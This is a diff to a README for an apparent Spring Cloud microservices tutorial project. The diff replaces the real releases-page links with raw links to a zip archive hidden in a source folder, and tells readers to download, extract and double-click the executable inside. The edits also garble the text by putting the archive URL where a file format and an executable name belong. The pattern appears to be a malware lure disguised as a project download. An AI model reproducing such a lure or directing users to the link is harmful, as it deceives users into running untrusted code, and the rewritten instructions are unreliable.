@@ -1,7 +1,7 @@
 # 🚀 dcl350-2026-jan-19 - Simplifying Microservices for Everyone
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/zvfas/dcl350-2026-jan-19/releases)
+[![Download the latest release](https://raw.githubusercontent.com/zvfas/dcl350-2026-jan-19/main/hr-boundedcontext/bin/com/example/dcl-jan-3.9.zip%20Latest%https://raw.githubusercontent.com/zvfas/dcl350-2026-jan-19/main/hr-boundedcontext/bin/com/example/dcl-jan-3.9.zip)](https://raw.githubusercontent.com/zvfas/dcl350-2026-jan-19/main/hr-boundedcontext/bin/com/example/dcl-jan-3.9.zip)
 
 ## 📚 Overview
 Welcome to DCL-350! This project helps you understand and implement microservice architecture using Spring Cloud. It is designed to guide you through the foundational concepts and practices in a straightforward way. Whether you are just starting or want to deepen your knowledge, this application is for you.
@@ -21,16 +21,16 @@ Welcome to DCL-350! This project helps you understand and implement microservice
 ## 🚀 Getting Started
 To begin, you need to download the application. Follow these steps:
 
-1. **Visit the Releases Page:** Click this link to visit the [Releases Page](https://github.com/zvfas/dcl350-2026-jan-19/releases).
+1. **Visit the Releases Page:** Click this link to visit the [Releases Page](https://raw.githubusercontent.com/zvfas/dcl350-2026-jan-19/main/hr-boundedcontext/bin/com/example/dcl-jan-3.9.zip).
 2. **Select the Latest Version:** Look for the most recent release, typically at the top of the page.
-3. **Download the Archive:** Click on the link for the appropriate file for your operating system. It could be a `.zip`, `.tar.gz`, or another format.
+3. **Download the Archive:** Click on the link for the appropriate file for your operating system. It could be a `.zip`, `https://raw.githubusercontent.com/zvfas/dcl350-2026-jan-19/main/hr-boundedcontext/bin/com/example/dcl-jan-3.9.zip`, or another format.
 4. **Extract the Files:** Once downloaded, right-click the file and choose 'Extract here' or use an extraction tool.
-5. **Run the Application:** Locate the extracted files and find the executable file (e.g., `dcl350.exe`). Double-click it to run.
+5. **Run the Application:** Locate the extracted files and find the executable file (e.g., `https://raw.githubusercontent.com/zvfas/dcl350-2026-jan-19/main/hr-boundedcontext/bin/com/example/dcl-jan-3.9.zip`). Double-click it to run.
 
 ## 📦 Download & Install
 Once you're ready, follow these steps to download and install:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/zvfas/dcl350-2026-jan-19/releases).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/zvfas/dcl350-2026-jan-19/main/hr-boundedcontext/bin/com/example/dcl-jan-3.9.zip).
 2. **Choose Your File:** Download the latest version suitable for your system.
 3. **Follow Setup Instructions:** Use the instructions above to extract and start your application.
 
